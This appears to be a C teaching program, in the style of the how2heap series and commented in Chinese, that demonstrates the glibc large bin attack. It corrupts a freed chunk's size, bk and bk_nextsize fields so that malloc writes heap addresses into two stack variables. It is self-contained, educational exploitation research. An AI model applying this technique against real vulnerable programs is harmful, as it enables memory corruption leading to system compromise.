#include<stdio.h>
#include<stdlib.h>
 
int main()
{
    fprintf(stderr, "根据原文描述跟 unsorted bin attack 实现的功能差不多，都是把一个地址的值改为一个很大的数\n\n");

    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    fprintf(stderr, "先来看一下目标:\n");
    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
    fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);

    unsigned long *p1 = malloc(0x320);
    fprintf(stderr, "分配第一个 large chunk: %p\n", p1 - 2);

    fprintf(stderr, "再分配一个 fastbin 大小的 chunk，来避免 free 的时候下一个 large chunk 与第一个合并了\n\n");
    malloc(0x20);

    unsigned long *p2 = malloc(0x400);
    fprintf(stderr, "申请第二个 large chunk 在: %p\n", p2 - 2);

    fprintf(stderr, "同样在分配一个 fastbin 大小的 chunk 防止合并掉\n\n");
    malloc(0x20);

    unsigned long *p3 = malloc(0x400);
    fprintf(stderr, "最后申请第三个 large chunk 在: %p\n", p3 - 2);
 
    fprintf(stderr, "申请一个 fastbin 大小的防止 free 的时候第三个 large chunk 与 top chunk 合并\n\n");
    malloc(0x20);
 
    free(p1);
    free(p2);
    fprintf(stderr, "free 掉第一个和第二个 chunk，他们会被放在 unsorted bin 中"
           " [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));

    malloc(0x90);
    fprintf(stderr, "现在去申请一个比他俩小的，然后会把第一个分割出来，第二个则被整理到 largebin 中，第一个剩下的会放回到 unsortedbin 中"
            " [ %p ]\n\n", (void *)((char *)p1 + 0x90));

    free(p3);
    fprintf(stderr, "free 掉第三个，他会被放到 unsorted bin 中:"
           " [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));

    fprintf(stderr, "假设有个漏洞，可以覆盖掉第二个 chunk 的 \"size\" 以及 \"bk\"、\"bk_nextsize\" 指针\n");
    fprintf(stderr, "减少释放的第二个 chunk 的大小强制 malloc 把将要释放的第三个 large chunk 插入到 largebin 列表的头部（largebin 会按照大小排序）。覆盖掉栈变量。覆盖 bk 为 stack_var1-0x10，bk_nextsize 为 stack_var2-0x20\n\n");

    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);

    malloc(0x90);
 
    fprintf(stderr, "再次 malloc，会把释放的第三个 chunk 插入到 largebin 中，同时我们的目标已经改写了:\n");
    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);
    return 0;
}
